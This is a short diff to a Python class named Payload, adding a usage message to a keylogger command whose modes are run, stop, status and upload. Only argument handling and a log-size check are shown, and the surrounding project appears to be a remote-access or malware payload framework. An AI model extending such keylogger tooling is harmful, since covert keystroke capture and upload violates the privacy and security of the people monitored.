@@ -1011,6 +1011,9 @@ class Payload():
         :param str mode:    run, stop, status, upload
 
         """
+        if mode is None:
+            return "keylogger <mode>\n\tmode: run, stop, status, upload"
+
         def status():
             try:
                 length = globals()['keylogger'].logs.tell()
